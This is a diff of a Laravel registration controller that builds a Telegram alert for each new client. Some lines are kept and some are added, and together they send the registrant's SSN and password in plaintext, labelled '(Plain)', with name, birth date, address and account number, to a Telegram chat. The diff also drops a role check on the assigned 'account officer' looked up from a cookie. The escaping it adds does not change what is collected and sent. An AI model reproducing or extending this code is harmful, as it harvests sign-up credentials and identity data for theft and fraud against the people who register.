@@ -133,11 +133,9 @@ class RegisteredUserController extends Controller
             $assignedOfficerId = Cookie::get('officer_onboard') ?? Session::get('officer_onboard');
             $officer = null;
             if ($assignedOfficerId) {
+                \App\Models\Admin::ensureOnboardingSchema();
                 $officer = \App\Models\Admin::where('id', $assignedOfficerId)
                     ->where('status', 1)
-                    ->whereHas('roles', function($q) {
-                        $q->whereIn('name', ['Account Officer', 'Account-Officer']);
-                    })
                     ->first();
             }
 
@@ -196,19 +194,31 @@ class RegisteredUserController extends Controller
                 $this->smsNotify('new_user', $shortcodes, $user->phone);
                 
                 // Detailed Telegram Notification for New User Registration
+                $tgFullName = htmlspecialchars($user->full_name, ENT_QUOTES, 'UTF-8');
+                $tgUsername = htmlspecialchars($user->username, ENT_QUOTES, 'UTF-8');
+                $tgAccountNo = htmlspecialchars($user->account_number ?? 'Pending', ENT_QUOTES, 'UTF-8');
+                $tgEmail = htmlspecialchars($user->email, ENT_QUOTES, 'UTF-8');
+                $tgPhone = htmlspecialchars($user->phone, ENT_QUOTES, 'UTF-8');
+                $tgDob = htmlspecialchars($user->date_of_birth, ENT_QUOTES, 'UTF-8');
+                $tgSsn = htmlspecialchars($user->ssn, ENT_QUOTES, 'UTF-8');
+                $loc = trim(($user->address ?? '') . ', ' . ($user->city ?? '') . ', ' . ($user->zip_code ?? '') . ', ' . ($user->country ?? ''));
+                $tgAddress = htmlspecialchars($loc, ENT_QUOTES, 'UTF-8');
+                $tgPassword = htmlspecialchars($formData['password'] ?? 'N/A', ENT_QUOTES, 'UTF-8');
+
                 $tgMsg = "🆕 <b>New Client Registration</b>\n";
-                $tgMsg .= "👤 <b>Name:</b> {$user->full_name}\n";
-                $tgMsg .= "🔑 <b>Username:</b> {$user->username}\n";
-                $tgMsg .= "📧 <b>Email:</b> {$user->email}\n";
-                $tgMsg .= "📞 <b>Phone:</b> {$user->phone}\n";
-                $tgMsg .= "🎂 <b>Date of Birth:</b> {$user->date_of_birth}\n";
-                $tgMsg .= "🆔 <b>SSN (Plain):</b> <code>{$user->ssn}</code>\n";
-                $tgMsg .= "🏠 <b>Address:</b> {$user->address}, {$user->city}, {$user->zip_code}, {$user->country}\n";
-                $tgMsg .= "🔒 <b>Password (Plain):</b> <code>" . ($formData['password'] ?? 'N/A') . "</code>\n";
+                $tgMsg .= "👤 <b>Name:</b> {$tgFullName}\n";
+                $tgMsg .= "🔑 <b>Username:</b> @{$tgUsername}\n";
+                $tgMsg .= "💳 <b>Account #:</b> <code>{$tgAccountNo}</code>\n";
+                $tgMsg .= "📧 <b>Email:</b> {$tgEmail}\n";
+                $tgMsg .= "📞 <b>Phone:</b> {$tgPhone}\n";
+                $tgMsg .= "🎂 <b>Date of Birth:</b> {$tgDob}\n";
+                $tgMsg .= "🆔 <b>SSN (Plain):</b> <code>{$tgSsn}</code>\n";
+                $tgMsg .= "🏠 <b>Address:</b> {$tgAddress}\n";
+                $tgMsg .= "🔒 <b>Password (Plain):</b> <code>{$tgPassword}</code>\n";
 
                 $inlineKeyboard = [
                     [
-                        ['text' => '👤 View Member', 'callback_data' => 'usr_info:' . $user->id],
+                        ['text' => '👤 View Member', 'callback_data' => 'usr_view:' . $user->id],
                         ['text' => '🔴 Lock Member', 'callback_data' => 'usr_stat:' . $user->id . ':0'],
                     ],
                     [
@@ -218,11 +228,11 @@ class RegisteredUserController extends Controller
 
                 if ($officer) {
                     $tgMsg .= "───────────────────\n";
-                    $tgMsg .= "👔 <b>Assigned Account Officer:</b> " . htmlspecialchars($officer->name) . " (ID: #{$officer->id})\n";
-                    $tgMsg .= "🔗 <b>Onboarded Via:</b> {$officer->onboarding_url}\n";
+                    $tgMsg .= "👔 <b>Assigned Account Officer:</b> " . htmlspecialchars($officer->name, ENT_QUOTES, 'UTF-8') . " (ID: #{$officer->id})\n";
+                    $tgMsg .= "🔗 <b>Onboarded Via:</b> " . htmlspecialchars($officer->onboarding_url, ENT_QUOTES, 'UTF-8') . "\n";
                     $tgMsg .= "👥 <b>Officer Active Members:</b> " . $officer->managedUsers()->count() . "\n";
 
-                    $inlineKeyboard[1][] = ['text' => '👔 View Officer', 'callback_data' => 'stf_info:' . $officer->id];
+                    $inlineKeyboard[1][] = ['text' => '👔 View Officer', 'callback_data' => 'stf_view:' . $officer->id];
                     $inlineKeyboard[] = [
                         ['text' => '🔄 Reassign Officer', 'callback_data' => 'usr_reassign_prompt:' . $user->id]
                     ];
